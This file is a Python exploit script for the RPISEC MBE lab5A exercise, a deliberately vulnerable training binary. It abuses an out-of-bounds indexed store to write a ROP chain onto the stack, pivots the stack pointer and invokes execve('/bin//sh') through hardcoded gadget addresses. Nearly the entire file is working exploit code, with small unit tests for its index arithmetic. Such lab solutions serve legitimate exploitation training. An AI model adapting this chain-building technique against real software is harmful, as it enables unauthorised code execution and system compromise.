#!/usr/bin/python

#
# ROP exploit for RPISEC MBE lab5A challenge.
# Mariusz B.
#

import sys
import ctypes

# Address of the first element to be stored at
STACK_BASE = 0xbffff488

def uint32(x):
    return ctypes.c_uint32(x).value

def get_idx(idx):
    if idx >= 0 and idx <= 100: 
        return idx
    elif idx < 0:
        return uint32(0 + idx)
    else: # idx > 100
        return 0x80000000 + idx

def address_to_index(addr):
    if addr > STACK_BASE:
        return (uint32(addr - STACK_BASE) / 4)
    else:
        return -(uint32(STACK_BASE - addr) / 4)

def index_to_address(idx):
    return uint32(STACK_BASE + 4 * get_idx(idx))

def store(idx, val):
    if idx > (STACK_BASE - 0x1000):
        # address has been passed as `idx` param
        _idx2 = address_to_index(idx)
        _idx = get_idx(_idx2)
        assert ((_idx2) % 3) != 0, \
            "Index=%d / 0x%x (for address: %x) is divisible by 3!" % (_idx2, _idx, idx)
    else:
        _idx = get_idx(idx)
        assert idx % 3 != 0, "Index=%d is divisible by 3!" % idx

    assert ((val & 0xff000000) >> 24) != 0xb7

    o = 'store\n'
    o+= '%u\n' % val
    o+= '%u\n' % _idx

    return o

def increment_idx(idx, num):
    if (idx+num) % 3 == 0:
        return num+1
    else:
        return num

def exp():
    global INDEX
    global STACK_BASE

    if len(sys.argv) > 1:
        n = sys.argv[1]
        STACK_BASE = int(n, 16)

        sys.stderr.write("Stack's base address: 0x%08x\n" % STACK_BASE)

    buf = ''
    
    # Stack's pivot positive offset (0x48)
    buf += store(1, 0x43434343)

    # Address of "/bin//sh" string on the stack, that will formulate a:
    # { "/bin//sh", null } array to be used by execve syscall.
    buf += store(2, STACK_BASE + 0x10)

    gadgets = [
        0x6e69622f,     # 04:   "/bin"
        0x68732f2f,     # 05:   "//sh"
        # 0x00000000    # 06:   zero, unused

                        # == PART B: EXECVE("/bin//sh",...) EXPLOIT STAGE
        0x08054c30,     # 07: xor eax, eax ; ret
        0x08096f78,     # 08: add eax, 9 ; pop edi ; ret
        # 0x00000000    # 09:   zero, popped to edi
        0x080980a7,     # 10: add eax, 2 ; ret
        0x0805cf90,     # 11: pop esi ; pop ebx ; ret
        # 0x00000000    # 12:   zero, popped to esi
        0x58585858,     # 13:   value for EBX, to be invalidated further
        0x0806f3aa,     # 14: pop edx ; ret
        # 0x00000000    # 15:   zero, popped to edx
        0x0806f3d1,     # 16: pop ecx ; pop ebx ; ret
                        # 17:   value for ECX, address of array: { "/bin//sh", null }
        STACK_BASE + 8, 
        # 0x00000000    # 18:   zero, popped to ebx, thus invalidating previously set EBX
        0x080bee63,     # 19: pop ebx ; pop edi ; ret
                        # 20:   value for EBX, address of "/bin//sh" string on the stack
        STACK_BASE + 16,
        # 0x00000000    # 21:   zero, popped to edi
        0x08048eaa,     # 22: int 0x80  ; execve(...)
        0x00000000,     # 23:   zero, unused
        # 0x00000000    # 24:   zero, unused
    ]

    # Step 1: Prepare stack's layout for further ROPs
    idx = 4
    for g in gadgets:
        buf += store(idx, g)
        idx += increment_idx(idx, 1)

    # 0x0806f3d1 : pop ecx ; pop ebx ; ret
    buf += store(STACK_BASE - 0x1c, 0x0806f3d1)

    # 0x0806f3d1 : pop ecx ; pop ebx ; ret
    buf += store(STACK_BASE - 0x14, 0x0806f3d1)
    buf += store(STACK_BASE - 0x10, STACK_BASE + 0x1c)

    # 0x080bc736 : mov esp, ecx ; ret
    buf += store(STACK_BASE - 8, 0x080bc736)

    # 0x08049f5e : pop esi ; pop edi ; pop ebp ; ret 8
    buf += store(-11, 0x08049f5e)

    buf += "quit\n"
    sys.stdout.write(buf)


def unit_tests():
    assert address_to_index(STACK_BASE + 0x0c) == 3
    assert address_to_index(STACK_BASE + 0x1c4) == 113
    assert address_to_index(STACK_BASE - 0x38) == -14
    assert index_to_address(3) == (STACK_BASE + 0x0c)
    assert index_to_address(113) == (STACK_BASE + 0x1c4)
    assert index_to_address(-14) == (STACK_BASE - 0x38)
    
    try:
        store(3, 0)
        assert False, "Index=3 shall be treated as illegal."
    except AssertionError: pass

    try:
        store(113, 0)
        assert False, "Index=113 shall be treated as illegal."
    except AssertionError: pass

    try:
        store(5, 0)
    except AssertionError:
        assert False, "Index=5 shall be treated as legal."

    try:
        store(112, 0)
    except AssertionError:
        assert False, "Index=112 shall be treated as legal."

if __name__ == '__main__':
    unit_tests()
    exp()


